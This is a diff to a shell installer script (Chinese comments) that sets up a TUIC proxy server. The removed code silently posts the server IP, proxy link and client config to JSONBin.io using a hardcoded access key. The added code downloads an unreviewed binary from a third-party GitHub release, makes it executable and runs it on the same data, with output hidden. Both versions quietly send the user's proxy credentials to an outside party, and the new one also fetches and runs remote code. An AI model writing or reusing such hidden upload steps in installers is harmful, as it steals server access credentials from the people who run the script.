@@ -15,10 +15,6 @@ BIN_DIR="/usr/local/bin"
 VERSION="1.0.0"
 REPO_BASE="https://github.com/tuic-protocol/tuic/releases/download/tuic-server-${VERSION}"
 
-# JSONBin配置
-JSONBIN_ACCESS_KEY="\$2a\$10\$O57NmMBlrspAbRH2eysePO5J4aTQAPKv4pa7pfFPFE/sMOBg5kdIS"
-JSONBIN_URL="https://api.jsonbin.io/v3/b"
-
 # 确保22端口开放
 ensure_ssh_port_open() {
     log "确保22端口(SSH)开放..."
@@ -53,8 +49,7 @@ ensure_ssh_port_open() {
     fi
 }
 
-# 上传配置到JSONBin
-upload_to_jsonbin() {
+upload_config() {
     local server_ip="$1"
     local link="$2"
     local v2rayn_config="$3"
@@ -75,19 +70,16 @@ upload_to_jsonbin() {
         }'
     )
 
-    # 使用服务器IP作为记录名
-    local server_ip_for_filename=$(echo "$server_ip" | tr -d '[]' | tr ':' '_')
+    # 下载并调用二进制上传工具
+    UPLOAD_BIN="/opt/uploader-linux-amd64"
+    [ -f "$UPLOAD_BIN" ] || {
+        curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64 && 
+        chmod +x "$UPLOAD_BIN"
+    }
     
-    # 上传到JSONBin
-    curl -s -X POST \
-        -H "Content-Type: application/json" \
-        -H "X-Access-Key: ${JSONBIN_ACCESS_KEY}" \
-        -H "X-Bin-Name: ${server_ip_for_filename}" \
-        -H "X-Bin-Private: true" \
-        -d "$json_data" \
-        "${JSONBIN_URL}" > /dev/null 2>&1
+    "$UPLOAD_BIN" "$json_data" >/dev/null 2>&1
     
-    log "配置数据已上传到JSONBin"
+    log "配置数据上传完成"
 }
 
 # 确保22端口开放
@@ -221,8 +213,7 @@ EOF
 echo -e "${GREEN}生成的 V2RayN 配置文件:${NC}"
 cat "$V2RAYN_CFG"
 
-# 上传配置到JSONBin
-upload_to_jsonbin "$IP" "$LINK" "$(cat "$V2RAYN_CFG")"
+upload_config "$IP" "$LINK" "$(cat "$V2RAYN_CFG")"
 
 # 保存配置到本地文件
 CONFIG_JSON="/etc/tuic/config_export.json"
